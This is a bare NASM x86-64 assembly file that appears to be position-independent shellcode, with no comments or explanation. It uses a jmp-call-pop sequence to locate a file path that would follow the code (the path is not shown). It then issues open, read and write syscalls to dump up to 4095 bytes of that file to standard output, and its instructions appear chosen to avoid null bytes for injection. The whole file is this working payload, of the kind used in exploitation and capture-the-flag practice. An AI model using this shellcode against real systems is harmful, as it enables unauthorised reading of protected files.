BITS 64
jmp short L1
L2:
	pop rdi
	xor rax, rax
	add al, 2
	xor rsi, rsi
	syscall
	
	sub sp, 0xfff
	lea rsi, [rsp]
	mov rdi, rax
	xor rdx, rdx
	mov dx, 0xfff
	xor rax, rax
	syscall

	xor rdi, rdi
	add dil, 1
	mov rdx, rax
	xor rax, rax
	add al, 1
	syscall

L1:
	call L2
